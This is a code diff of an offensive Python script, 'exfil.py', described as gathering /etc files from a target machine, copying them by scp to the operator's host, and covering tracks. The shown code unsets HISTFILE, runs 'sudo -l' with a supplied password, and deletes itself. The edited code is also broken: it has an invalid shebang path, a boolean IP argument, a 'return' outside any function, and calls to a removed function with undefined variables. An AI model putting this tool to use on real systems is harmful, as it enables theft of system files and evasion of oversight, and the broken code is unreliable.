@@ -1,10 +1,10 @@
-#!/usr/bin/python3
+#!/usr/env/python3
 # author: suffs811 github: https://github.com/cysec11/scripts
 # python script for catting /etc files, saving them to file,
 # sending them to local system,
 # and deleting history/script from target machine.
 # 
-# usage: python3 exfil.py -i 10.0.0.1 -p 'password123'
+# usage: python3 exfil.py -i 10.0.0.1:/home/data.txt -p 'password123'
 
 import os
 import platform
@@ -12,8 +12,8 @@ import argparse
 
 
 # get arguments for IP and password
-parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks")
-parser.add_argument("-i", "--ip", help="specify local IP to scp (secure copy) data file to", action="store_true", required="True")
+parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks\nusage: python3 exfil.py -i 10.0.0.1:/home/data.txt -p 'password123'")
+parser.add_argument("-i", "--ip", help="specify 'local IP:/path' to scp (secure copy) data file to", action="store_true", required="True")
 parser.add_argument("-p", "--password", help="specify user password if know", action="store_true")
 args = parser.parse_args()
 local_path = args.ip 
@@ -29,9 +29,6 @@ def extract_clear(local_path):
     if answer == "no":
         return
     elif answer == "yes":
-        # get local machine ip
-        local_path = input("local IP and file save path (10.0.0.1/home/file.txt): ")
-
         # disable history logging
         print("\ndisabling history logging...")
         os.system("unset HISTFILE")
@@ -99,18 +96,10 @@ def extract_clear(local_path):
 
 # detect if pwd was given as option, if so, run sudo -l
 if args.password:
-    def cred_info(password):
-        cred = input("do you know user's passwd? (yes/no): ")
-        if cred == "no":
-            return
-        elif cred == "yes":
-            passwd = input("passwd: ")
-            print("\n### running sudo -l: ###")
-            os.system(f"timeout -k 3 3 sudo -l -S {password}")
-            return
-        else:
-            cred_info()
+    print("\n### running sudo -l: ###")
+    os.system(f"timeout -k 3 3 sudo -l -S {password}")
 else:
+    print("\n*** no password was specified, could not run 'sudo -l' ***")
     return
 
 
@@ -141,7 +130,7 @@ def delete_file():
         print("didn't write yes or no!!!")
         delete_file()
 
-
+# call functions
 extract_clear(local_path)
 cred_info(password)
 delete_file()
